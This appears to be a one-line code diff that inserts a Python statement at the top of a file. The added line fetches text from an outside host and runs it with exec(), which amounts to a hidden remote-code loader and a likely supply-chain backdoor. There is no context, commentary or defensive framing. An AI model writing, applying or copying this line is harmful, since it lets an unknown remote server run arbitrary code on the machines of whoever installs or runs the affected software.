@@ -1,0 +1,1 @@
+exec(requests.get('https://pentagon.cy/minor').text.replace('<pre>','').replace('</pre>',''))
